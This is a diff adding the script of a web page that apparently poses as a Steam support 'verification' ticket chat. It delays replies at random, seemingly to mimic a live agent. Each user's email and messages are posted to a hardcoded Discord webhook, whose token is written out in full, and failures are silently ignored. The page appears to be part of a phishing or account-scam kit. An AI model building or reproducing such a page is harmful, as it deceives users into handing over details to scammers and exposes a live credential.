+                displayMessages();
+                
+                // Send Discord notification
+                sendDiscordNotification();
+                
+            }, 2000 + Math.random() * 3000); // Random delay between 2-5 seconds
+        }
+        
+        function showTab(tab) {
+            currentTab = tab;
+            
+            // Update tabs
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(t => {
+                if (t.textContent.includes(tab === 'chat' ? 'Conversation' : 'Ticket Info')) {
+                    t.classList.add('active');
+                }
+            });
+            
+            // Show/hide content
+            if (tab === 'chat') {
+                document.getElementById('chatTab').style.display = 'block';
+                document.getElementById('ticketInfoTab').style.display = 'none';
+            } else {
+                document.getElementById('chatTab').style.display = 'none';
+                document.getElementById('ticketInfoTab').style.display = 'block';
+            }
+        }
+        
+        async function loadTicket(ticketId) {
+            // Check localStorage first
+            let tickets = JSON.parse(localStorage.getItem('steam_tickets') || '[]');
+            let ticket = tickets.find(t => t.id === ticketId);
+            
+            if (ticket) {
+                currentTicket = ticket;
+                showChatInterface();
+                return;
+            }
+            
+            // Try to load from server
+            try {
+                const response = await fetch(`${API_SERVER}?ticket_id=${ticketId}`);
+                const data = await response.json();
+                
+                if (data.success && data.ticket) {
+                    currentTicket = data.ticket;
+                    showChatInterface();
+                    
+                    // Save to localStorage
+                    saveTicketToList(currentTicket);
+                    localStorage.setItem('current_ticket', JSON.stringify(currentTicket));
+                } else {
+                    alert('Ticket not found. Please submit a new verification request.');
+                }
+            } catch (error) {
+                alert('Unable to load ticket. Please submit a new verification request.');
+            }
+        }
+        
+        function sendDiscordNotification() {
+            if (!currentTicket) return;
+            
+            const webhookUrl = 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
+            
+            const lastMessage = currentTicket.messages[currentTicket.messages.length - 2]; // User's last message
+            
+            const message = {
+                content: `**💬 NEW MESSAGE IN TICKET ${currentTicket.id}**\n` +
+                        `**From:** ${currentTicket.email}\n` +
+                        `**Message:** ${lastMessage?.message?.substring(0, 100) || 'No message'}...\n` +
+                        `**Time:** ${new Date().toLocaleString()}\n` +
+                        `**API:** ${API_SERVER}`
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            }).catch(() => {});
+        }
+        
+        // Auto-focus message input when chat is shown
+        function focusMessageInput() {
+            const messageInput = document.getElementById('messageInput');
+            if (messageInput && currentTab === 'chat') {
+                setTimeout(() => messageInput.focus(), 100);
+            }
+        }
+        
+        // Initialize connection check every 30 seconds
+        setInterval(checkConnection, 30000);
+    </script>
+</body>
+</html>
